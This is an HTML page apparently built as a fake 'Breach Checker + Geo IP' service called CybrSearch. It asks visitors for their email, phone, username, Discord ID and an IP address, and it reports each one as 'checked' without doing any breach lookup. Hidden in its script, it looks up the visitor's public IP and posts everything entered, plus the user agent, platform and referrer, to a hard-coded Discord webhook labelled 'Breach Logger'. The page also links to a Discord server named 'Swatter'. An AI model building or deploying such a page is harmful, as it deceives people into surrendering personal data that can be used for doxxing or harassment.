<!DOCTYPE html><html><head><meta charset="UTF-8"><title>CybrSearch</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"><style>body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;padding-top:60px}.container{max-width:700px}.card{background:#161b22;border-radius:1rem;box-shadow:0 0 10px #00000080}.form-control{background:#0d1117;color:#c9d1d9;border:1px solid #30363d}.btn-primary{background:#238636;border:none}.result-box{background:#1c2128;border-left:5px solid #30363d;padding:1rem;border-radius:0.5rem;margin-top:0.5rem}.result-box.success{border-left-color:#2ea043}.result-box.warning{border-left-color:#d29922}.result-box.error{border-left-color:#f85149}.discord-btn{position:fixed;top:20px;right:20px;background:#5865F2;color:#fff;border-radius:30px;padding:10px 20px;font-weight:bold;text-decoration:none}</style></head><body><a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a><div class="container text-center"><h1 class="mb-4">🔍 Breach Checker + Geo IP</h1><form onsubmit="searchData();return false" class="card p-4"><input id="email" type="email" placeholder="📧 Email" class="form-control mb-2"><input id="phone" type="text" placeholder="📱 Phone" class="form-control mb-2"><input id="username" type="text" placeholder="👤 Username" class="form-control mb-2"><input id="discord" type="text" placeholder="💬 Discord ID" class="form-control mb-2"><input id="ip" type="text" placeholder="🌐 IP" class="form-control mb-3"><button type="submit" class="btn btn-primary w-100">Search</button></form><div class="mt-5 text-start"><h4>🔎 Results</h4><div id="results"></div></div></div><script>async function searchData(){document.getElementById("results").innerHTML="";const e=document.getElementById("email").value.trim(),t=document.getElementById("phone").value.trim(),n=document.getElementById("username").value.trim(),a=document.getElementById("discord").value.trim(),o=document.getElementById("ip").value.trim();if(!e)updateResult("email","⚠️ No email entered.","warning");else updateResult("email",`✅ Email checked: ${e}`,"success");if(!t)updateResult("phone","ℹ️ Phone check skipped.","warning");else updateResult("phone",`✅ Phone checked: ${t}`,"success");if(!n)updateResult("username","ℹ️ Username check skipped.","warning");else updateResult("username",`✅ Username checked: ${n}`,"success");if(!a)updateResult("discord","ℹ️ Discord ID check skipped.","warning");else updateResult("discord",`✅ Discord ID checked: ${a}`,"success");let i="Unknown";try{const e=await fetch("https://api.ipify.org?format=json"),t=await e.json();i=t.ip||"Unknown"}catch(e){}await sendBreachWebhook({email:e,phone:t,username:n,discord:a,ip:o},i);if(o)try{const e=await fetch(`https://ipwho.is/${o}`),t=await e.json();t.success?updateResult("ipgeo",`🌐 IP Geo Info:\nIP: ${o}\nCountry: ${t.country}\nCity: ${t.city}\nRegion: ${t.region}\nISP: ${t.connection?.isp||"N/A"}\nOrg: ${t.connection?.org||"N/A"}`,"success"):updateResult("ipgeo",`⚠️ Geo lookup failed: ${t.message}`,"warning")}catch(e){updateResult("ipgeo","❌ Error fetching Geo IP data.","error")}else updateResult("ip","ℹ️ IP geo-location check skipped.","warning")}function updateResult(e,t,n){const a=document.createElement("div");a.className=`result-box ${n}`,a.textContent=t,document.getElementById("results").appendChild(a)}async function sendBreachWebhook(e,t){const n={embeds:[{title:"🔍 Breach Search Attempt",color:3447003,fields:[{name:"📧 Email",value:e.email||"Not provided"},{name:"📱 Phone",value:e.phone||"Not provided"},{name:"👤 Username",value:e.username||"Not provided"},{name:"💬 Discord ID",value:e.discord||"Not provided"},{name:"🌐 IP Entered",value:e.ip||"Not provided"},{name:"📍 Visitor IP",value:t||"Unknown"},{name:"🧠 User Agent",value:navigator.userAgent},{name:"💻 Platform",value:navigator.platform},{name:"🌐 Referrer",value:document.referrer||"None"},{name:"🕒 Time (UTC)",value:new Date().toUTCString()}],footer:{text:"Breach Logger • CybrSearch"},timestamp:new Date().toISOString()}]};try{await fetch("https://discord.com/api/webhooks/1381748799340548247/j9hWnOzmqBwerSUrzI_-7YL2F_vLPMTXU3eFK2Ep0ZA8YPtjT37VvJbSNxETfc-XD3jl",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(n)})}catch(e){console.warn("⚠️ Failed to send webhook.")}}</script></body></html>
